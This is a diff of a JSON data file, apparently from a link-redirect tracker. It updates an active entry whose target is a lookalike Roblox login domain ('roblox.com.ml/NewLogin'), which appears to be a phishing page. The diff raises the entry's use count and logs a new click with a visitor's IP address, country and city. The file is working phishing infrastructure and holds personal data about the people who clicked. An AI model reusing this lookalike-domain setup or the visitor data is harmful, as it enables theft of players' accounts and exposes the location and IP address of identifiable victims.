@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 410,
+    "useCount": 411,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3387,6 +3387,14 @@
       },
       {
         "timestamp": 1777049189168,
+        "ip": "31.183.255.231",
+        "country": "Poland",
+        "city": "Lodz",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777049286158,
         "ip": "31.183.255.231",
         "country": "Poland",
         "city": "Lodz",
